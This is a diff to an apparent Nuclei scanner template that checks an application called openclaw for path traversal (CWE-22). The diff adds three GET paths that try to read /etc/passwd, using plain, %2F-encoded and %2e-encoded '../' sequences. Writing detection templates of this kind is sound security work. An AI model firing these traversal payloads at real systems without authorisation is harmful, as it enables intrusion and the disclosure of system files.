@@ -10,7 +10,7 @@ info:
   classification:
     cwe-id: CWE-22
   metadata:
-    max-request: 3
+    max-request: 6
     verified: false
     product: openclaw
     vendor: openclaw
@@ -18,8 +18,11 @@ info:
 http:
   - method: GET
     path:
+      - "{{BaseURL}}/__openclaw/plugins/../../../etc/passwd"
       - "{{BaseURL}}/__openclaw__/plugins/../../../etc/passwd"
+      - "{{BaseURL}}/__openclaw/plugins/..%2F..%2F..%2Fetc%2Fpasswd"
       - "{{BaseURL}}/__openclaw__/plugins/..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}/__openclaw/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
       - "{{BaseURL}}/__openclaw__/plugins/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
     matchers-condition: and
     matchers:
